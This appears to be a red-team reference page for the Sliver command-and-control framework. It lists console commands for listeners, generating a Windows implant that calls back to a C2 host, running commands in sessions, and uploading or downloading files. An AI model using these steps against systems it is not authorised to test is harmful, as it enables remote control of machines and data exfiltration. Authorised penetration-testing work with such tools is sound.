# Sliver

<div class="ol-section-kicker"><span>TOOL</span><strong>SLIVER</strong></div>

## Start server
```bash
sliver-server
```
**Tool:** Sliver · **Platform:** Linux · **Tags:** C2, Server · **Context:** Operator

## Start client
```bash
sliver-client
```
**Tool:** Sliver · **Platform:** Any · **Tags:** C2, Client · **Context:** Operator

## HTTP listener
```text
http --lhost <LHOST> --lport <LPORT>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** HTTP, Listener · **Context:** Operator

## HTTPS listener
```text
https --lhost <LHOST> --lport <LPORT>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** HTTPS, Listener · **Context:** Operator

## mTLS listener
```text
mtls --lhost <LHOST> --lport <LPORT>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** mTLS, Listener · **Context:** Operator

## Generate Windows implant
```text
generate --os windows --arch amd64 --mtls <C2_HOST>:<LPORT> --save <OUTPUT_DIR>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** Implant, Windows · **Context:** Operator

## Sessions
```text
sessions
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** Sessions · **Context:** Operator

## Select session
```text
use <SESSION_ID>
```
**Tool:** Sliver · **Platform:** Sliver console · **Tags:** Sessions · **Context:** Operator

## Execute command
```text
execute -o whoami /all
```
**Tool:** Sliver · **Platform:** Sliver session · **Tags:** Execution · **Context:** Session

## Upload file
```text
upload <LOCAL_FILE> <REMOTE_PATH>
```
**Tool:** Sliver · **Platform:** Sliver session · **Tags:** File Transfer · **Context:** Session

## Download file
```text
download <REMOTE_FILE> <LOCAL_PATH>
```
**Tool:** Sliver · **Platform:** Sliver session · **Tags:** File Transfer · **Context:** Session

**Related:** [Red Team Sliver C2](../red-team/sliver.md) · [Staging & File Transfer](../red-team/staging-file-transfer.md)
